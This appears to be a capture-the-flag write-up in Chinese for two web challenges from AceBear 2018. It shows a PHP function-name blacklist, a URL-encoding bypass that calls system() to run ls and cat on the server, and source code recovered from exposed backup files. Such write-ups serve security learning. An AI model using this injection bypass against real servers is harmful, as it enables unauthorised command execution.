# AceBear Security Contest 2018 - Notes

## Url Parameter
> Description:
> this chall sucks, you should watch VIE vs UZB match. :) VIET NAM VO DICH!
> [link](http://35.196.45.11:8080/)

打開頁面是空的，看 /robots.txt
```
# you know de wae ma queen
User-Agent: *
Disallow: /?debug
```

打開 /?debug 可以看到

```php
$blacklist = "assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob";

if(count($_GET) > 0){
	if(preg_match("/$blacklist/i",$_SERVER["REQUEST_URI"])) die("No no no hackers!!");
	list($key, $val) = each($_GET);
	$key($val);
}
```

隨便在網址打 http://35.196.45.11:8080/?test=1 ，會得到
```
Function not found!!
```

在網址打 http://35.196.45.11:8080/?%73ystem=ls ，可以得到
```
flag-a-long-name-that-you-wont-know.php index.php robots.txt
``` 

在網址改打 http://35.196.45.11:8080/?%73ystem=cat%20flag-a-long-name-that-you-wont-know.php

打開看 source code 可以看到答案

## BearShare

打開網站，有兩個頁面
![image](gB4xxuS.png)
和
![image](YFJEhIV.png)

然後看 /robots.txt

```
User-agent: *
Disallow: /backup_files
```

看 /backup_files 有兩個檔案 download.txt 和 index.txt 是網頁的 source code

在 download.txt 有一段 code ，可以讓我們知道如何得到 flag
```php
    if(isset($_POST['messid'])){

	$messid = $_POST['messid'];
	validate_hash();
	$url="";
	if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local'){
		$url = 'http://'.$_POST['storagesv'].'/';
	} elseif ($_POST['storagesv']==="gimmeflag") {
		die('AceBear{******}');
	}
```

